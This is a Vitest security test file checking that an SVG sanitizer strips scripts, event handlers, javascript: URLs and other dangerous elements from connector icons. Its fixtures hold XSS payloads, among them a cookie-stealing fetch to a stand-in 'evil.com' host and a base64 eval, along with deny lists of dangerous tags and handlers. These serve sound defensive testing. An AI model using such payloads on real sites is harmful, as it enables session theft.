/**
 * Security tests for SVG sanitization in connector icons.
 *
 * These tests ensure that malicious SVG content is properly stripped
 * when connector icons are rendered, preventing XSS attacks.
 *
 * NOTE: This file intentionally contains malicious payloads (javascript: URLs,
 * XSS vectors) to verify they are properly sanitized. These are test fixtures,
 * not executable code.
 */
/* eslint-disable sonarjs/code-eval -- Security test file: malicious payloads are test fixtures */
import { describe, it, expect } from "vitest";
import { sanitizeSvg, SVG_SANITIZE_CONFIG } from "./svg-sanitization";

describe("SVG Sanitization Security", () => {
  describe("sanitizeSvg", () => {
    it("should preserve valid SVG elements", () => {
      const validSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M12 2L2 7l10 5 10-5-10-5z" fill="currentColor"/>
        <circle cx="12" cy="12" r="4"/>
        <rect x="4" y="4" width="16" height="16"/>
      </svg>`;

      const result = sanitizeSvg(validSvg);

      expect(result).toContain("<svg");
      expect(result).toContain("<path");
      expect(result).toContain("<circle");
      expect(result).toContain("<rect");
      expect(result).toContain('viewBox="0 0 24 24"');
    });

    it("should strip script tags from SVG", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <script>alert('XSS')</script>
        <path d="M12 2L2 7"/>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert");
      expect(result).toContain("<path");
    });

    it("should strip onclick and other event handlers", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2" onclick="alert('XSS')" onmouseover="steal()" onload="hack()"/>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("onclick");
      expect(result).not.toContain("onmouseover");
      expect(result).not.toContain("onload");
      expect(result).not.toContain("alert");
      expect(result).toContain("<path");
    });

    it("should strip javascript: URLs in href", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <a href="javascript:alert('XSS')">
          <path d="M12 2"/>
        </a>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("javascript:");
      expect(result).not.toContain("alert");
    });

    it("should strip foreignObject elements (can embed HTML)", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <foreignObject>
          <div xmlns="http://www.w3.org/1999/xhtml">
            <script>alert('XSS')</script>
          </div>
        </foreignObject>
        <path d="M12 2"/>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("<foreignObject");
      expect(result).not.toContain("<div");
      expect(result).not.toContain("<script");
      expect(result).toContain("<path");
    });

    it("should strip image tags entirely (not in allowlist)", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <image href="data:text/html,<script>alert('XSS')</script>"/>
        <path d="M12 2"/>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      // image tag is not in our allowlist, so it gets removed entirely
      expect(result).not.toContain("<image");
      expect(result).toContain("<path");
    });

    it("should strip xlink:href with javascript", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <use xlink:href="javascript:alert('XSS')"/>
        <path d="M12 2"/>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("javascript:");
      expect(result).toContain("<path");
    });

    it("should strip style attributes entirely (not in allowlist)", () => {
      // Note: style attribute is intentionally not in our allowlist because
      // it can contain CSS expressions with javascript: URLs
      const svgWithStyle = `<svg xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2" style="fill: red"/>
      </svg>`;

      const result = sanitizeSvg(svgWithStyle);

      // style attribute is not in our allowlist, so it gets removed
      // This is by design - use fill/stroke attributes instead
      expect(result).not.toContain("style=");
      expect(result).toContain("<path");
      expect(result).toContain('d="M12 2"');
    });

    it("should handle complex nested malicious content", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <defs>
          <script>window.stolen = document.cookie</script>
        </defs>
        <g onclick="fetch('evil.com?c='+document.cookie)">
          <path d="M12 2" onload="eval(atob('YWxlcnQoJ1hTUycp'))"/>
          <animate attributeName="href" values="javascript:alert(1)"/>
        </g>
      </svg>`;

      const result = sanitizeSvg(maliciousSvg);

      expect(result).not.toContain("<script");
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("onload");
      expect(result).not.toContain("javascript:");
      expect(result).not.toContain("fetch");
      expect(result).not.toContain("eval");
      expect(result).toContain("<path");
      expect(result).toContain("<g");
      expect(result).toContain("<defs");
    });

    it("should preserve stroke and fill attributes", () => {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M12 2" fill="currentColor" stroke="#000" stroke-width="2" stroke-linecap="round"/>
      </svg>`;

      const result = sanitizeSvg(svg);

      expect(result).toContain('fill="currentColor"');
      expect(result).toContain('stroke="#000"');
      expect(result).toContain('stroke-width="2"');
      expect(result).toContain('stroke-linecap="round"');
    });

    it("should preserve transform attribute", () => {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg">
        <g transform="translate(10, 10) rotate(45)">
          <path d="M0 0 L10 10"/>
        </g>
      </svg>`;

      const result = sanitizeSvg(svg);

      expect(result).toContain('transform="translate(10, 10) rotate(45)"');
    });

    it("should handle empty SVG string gracefully", () => {
      expect(sanitizeSvg("")).toBe("");
    });

    it("should handle malformed SVG gracefully", () => {
      const malformed = "<svg><path d='M0 0'";
      const result = sanitizeSvg(malformed);
      // DOMPurify should handle this gracefully
      expect(typeof result).toBe("string");
    });
  });

  describe("SVG_SANITIZE_CONFIG", () => {
    it("should NOT use SVG profile (to avoid unwanted tag merging)", () => {
      // We explicitly define all allowed tags/attrs instead of using profiles
      // because profiles merge with our allowlist rather than replacing it
      expect(SVG_SANITIZE_CONFIG.USE_PROFILES).toBeUndefined();
    });

    it("should allowlist only safe SVG tags", () => {
      const safeTags = [
        "svg",
        "path",
        "circle",
        "rect",
        "line",
        "polyline",
        "polygon",
        "g",
        "defs",
        "use",
        "ellipse",
        "text",
        "tspan",
      ];

      for (const tag of safeTags) {
        expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).toContain(tag);
      }
    });

    it("should not include dangerous tags in allowlist", () => {
      const dangerousTags = [
        "script",
        "foreignObject",
        "animate",
        "animateTransform",
        "set",
        "a",
        "image",
        "iframe",
      ];

      for (const tag of dangerousTags) {
        expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).not.toContain(tag);
      }
    });

    it("should not include event handler attributes", () => {
      const eventHandlers = [
        "onclick",
        "onload",
        "onerror",
        "onmouseover",
        "onfocus",
      ];

      for (const attr of eventHandlers) {
        expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR).not.toContain(attr);
      }
    });
  });
});
